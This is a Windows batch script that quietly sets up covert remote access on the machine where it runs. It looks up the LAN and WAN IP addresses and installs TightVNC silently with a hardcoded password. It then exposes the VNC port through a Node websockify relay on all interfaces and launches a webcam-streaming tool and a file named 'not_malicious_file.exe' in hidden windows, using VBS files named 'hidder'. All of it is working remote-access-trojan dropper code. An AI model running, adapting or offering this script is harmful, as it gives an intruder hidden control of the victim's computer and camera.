@echo off

cd %APPDATA%

REM get LAN ip address
for /f "delims=[] tokens=2" %%a in ('ping -4 -n 1 %ComputerName% ^| findstr [') do set LANIP=%%a
echo LAN IP: %LANIP%

REM get WAN ip address
for /f %%A in (
  'powershell -command "(Invoke-Webrequest "http://api.ipify.org").content"'
) do Set WANIP=%%A
echo WAN IP : %WANIP% 

REM DL and autoinstall tightvnc

curl.exe --output tightvnc.msi --url https://www.tightvnc.com/download/2.8.63/tightvnc-2.8.63-gpl-setup-64bit.msi
msiexec.exe /i tightvnc.msi /quiet /norestart SET_USEVNCAUTHENTICATION=1 VALUE_OF_USEVNCAUTHENTICATION=1 SET_PASSWORD=1 VALUE_OF_PASSWORD=mlkpoi1$


REM DL and autoinstall node for noVNC

curl.exe --output node.msi --url https://nodejs.org/dist/v16.16.0/node-v16.16.0-x64.msi
msiexec.exe /i node.msi /qn


REM Create websockify file

echo var websockify = require('node-websockify'); > websockify.js
echo websockify({ >> websockify.js
echo source: '0.0.0.0:8000', >> websockify.js
echo target: '%LANIP%:5900' >> websockify.js
echo }); >> websockify.js

echo Dim WShell > vnc_hidder.vbs
echo Set WShell = CreateObject("WScript.Shell") >> vnc_hidder.vbs
echo WShell.Run "node websockify.js", 0 >> vnc_hidder.vbs
echo Set WShell = Nothing >> vnc_hidder.vbs
wscript vnc_hidder.vbs

echo Dim WShell > cam2ip_hidder.vbs
echo Set WShell = CreateObject("WScript.Shell") >> cam2ip_hidder.vbs
echo WShell.Run "cam2ip.exe", 0 >> cam2ip_hidder.vbs
echo Set WShell = Nothing >> cam2ip_hidder.vbs
wscript cam2ip_hidder.vbs


echo Dim WShell > ratz_hidder.vbs
echo Set WShell = CreateObject("WScript.Shell") >> ratz_hidder.vbs
echo WShell.Run "not_malicious_file.exe", 0 >> ratz_hidder.vbs
echo Set WShell = Nothing >> ratz_hidder.vbs
wscript ratz_hidder.vbs
